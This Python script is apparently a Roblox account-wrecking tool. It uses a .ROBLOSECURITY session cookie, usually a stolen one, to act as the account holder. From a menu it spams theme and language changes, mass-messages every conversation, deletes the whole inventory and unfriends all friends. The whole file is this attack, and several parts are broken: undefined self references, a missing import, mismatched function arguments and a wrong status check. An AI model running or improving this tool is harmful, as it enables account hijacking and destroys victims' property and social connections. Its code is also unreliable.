# made by blood#1000
# endpoints gotten from Theonlyicebear


import httpx
import time
import json
import threading
from colorama import Fore, Style, init; init()
cookie = json.loads(open("config.json", "r").read())["cookie"]
print(f"{Fore.WHITE}[{Fore.YELLOW}*{Fore.WHITE}] Checking Cookie")
check = httpx.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)})
if not check.status_code == 200:
  print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}] Invalid Cookie")
  exit()
print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Working Cookie")
userid = httpx.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY": cookie}).json()["id"]
print(f"{Fore.WHITE}[{Fore.YELLOW}*{Fore.WHITE}] Starting Menu...")


headers={'X-CSRF-TOKEN': httpx.post("https://auth.roblox.com/v2/logout", cookies={'.ROBLOSECURITY': cookie}).headers["x-csrf-token"]}


def flash(cookie, delay):
  while True:
    httpx.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=headers,data={"themeType": "Light"})
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Lightmode Enabled")
    httpx.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=headers,data={"themeType": "Dark"})
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Darkmode Enabled")
    time.sleep(delay)
def lang(cookie, delay):
  while True:
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Japanese Enabled")
    httpx.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': cookie},headers=headers,data={"supportedLocaleCode": "ja_jp"})
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Korean Enabled")
    httpx.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': cookie},headers=headers,data={"supportedLocaleCode": "ko_kr"})
    time.sleep(delay)
def message(cookie, headers, dm, message):
  httpx.post("https://chat.roblox.com/v2/send-message",data={"conversationId": dm, "message": message}, cookies={'.ROBLOSECURITY': cookie}, headers=headers)
  print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Sent DM")
def delete(cookie, headers, id):
  while True:
    response = httpx.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": id},cookies={'.ROBLOSECURITY': cookie}, headers=headers)
    if not response == 429:
      print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Deleted Item")
      break
    time.sleep(10)
def remove(cookie, headers, friend):
  httpx.post(f"https://friends.roblox.com/v1/users/{friend}/unfriend",cookies={'.ROBLOSECURITY': cookie}, headers=headers)
  print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Removed Friend")
while True:
  os.system("cls||clear")
  print("                ╔═╗╦═╗╔═╗ ╦")
  print("                ╠╣ ╠╦╝║ ║ ║")
  print(f"              {Style.DIM}╚  ╩╚═╚═╝╚╝")
  print()
  print(" ╔════════════════════╦═══════════════════╗")
  print(" ║   [1] Theme Spam   ║   [2] Lang Spam   ║")
  print(" ╠════════════════════╬═══════════════════╣")
  print(" ║    [3] Mass DM     ║[4] Clear Inventory║")
  print(" ╠════════════════════╩═══════════════════╣")
  print(" ║             [5] Unfriend All           ║")
  print(" ╚════════════════════════════════════════╝\n")
  option = input("[>] ")
  if option == "1":
    delay = int(input("[>] Delay: "))
    flash(cookie, delay, headers)
  elif option == "2":
    delay = int(input("[>] Delay: "))
    lang(cookie, delay, headers)
  elif option == "3":
    delay = input("[>] Message: ")
    dms = httpx.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",cookies={'.ROBLOSECURITY': cookie}, headers=headers).json()
    for dm in dms:
      t=threading.Thread(target=message, args=(cookie, headers, dm["id"], message, ))
      t.start()
    t.join()
  elif option == "4":
    items = httpx.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",cookies={'.ROBLOSECURITY': cookie}, headers=headers).json()["Data"]["Items"]
    for item in items:
      item=item["Item"]["AssetId"]
      t=threading.Thread(target=delete, args=(cookie, headers, item, ))
      t.start()
    t.join()
  elif option == "5":
    friends = [friend['id'] for friend in httpx.get(f"https://friends.roblox.com/v1/users/{userid}/friends", cookies={'.ROBLOSECURITY': cookie}).json()['data']]
    for friend in friends:
      t=threading.Thread(target=remove, args=(cookie, headers, friend)).start()
